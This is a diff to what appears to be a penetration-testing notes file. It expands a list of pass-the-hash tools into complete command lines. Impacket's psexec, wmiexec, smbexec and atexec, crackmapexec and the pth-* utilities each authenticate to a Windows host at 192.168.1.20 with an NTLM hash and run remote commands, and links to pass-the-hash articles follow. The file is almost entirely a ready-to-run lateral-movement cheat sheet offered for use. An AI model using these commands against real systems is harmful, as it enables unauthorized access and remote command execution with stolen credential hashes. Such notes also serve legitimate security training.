@@ -6102,14 +6102,19 @@ Now run the following
 Checklist:
 
 	pth-winexe
-	psexec.py
- 	wmiexec.py
- 	psexec from metasploit
-	smbclient.py
-	pth-smbclient
-	crackmapexec
-	pth-wmi
-	
-Set on the hash the first two hahes inside the `:`
+	psexec from metasploit
+	python psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:3d278165f6d949465b60d71d42ae7ded user1@192.168.1.20
+	python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:3d278165f6d949465b60d71d42ae7ded ssi/user1@192.168.1.20
+	python smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:3d278165f6d949465b60d71d42ae7ded ssi/user1@192.168.1.20
+	python smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:3d278165f6d949465b60d71d42ae7ded ssi/user1@192.168.1.20
+	pth-smbclient -U ssi/user1%aad3b435b51404eeaad3b435b51404ee:3d278165f6d949465b60d71d42ae7ded //192.168.1.20/c$
+	crackmapexec smb 192.168.1.20 -u user1 -H 3d278165f6d949465b60d71d42ae7ded -x whoami
+	pth-wmic -U ssi/user1%aad3b435b51404eeaad3b435b51404ee:3d278165f6d949465b60d71d42ae7ded //192.168.1.20 “select Name from Win32_UserAccount”
+	python rpcdump.py -hashes aad3b435b51404eeaad3b435b51404ee:3d278165f6d949465b60d71d42ae7ded ssi/user1@192.168.1.20
+	pth-rpcclient -U ssi/user1%aad3b435b51404eeaad3b435b51404ee:3d278165f6d949465b60d71d42ae7ded //192.168.1.20
+	python atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:3d278165f6d949465b60d71d42ae7ded user1@192.168.1.20 whoami
+
+ [References from above](https://meriemlarouim.medium.com/pass-the-hash-gaining-access-without-cracking-passwords-ce67c267c491)
+ [Another]([url](https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/)https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/)
 
 ## NEXT TUTO HERE SOON
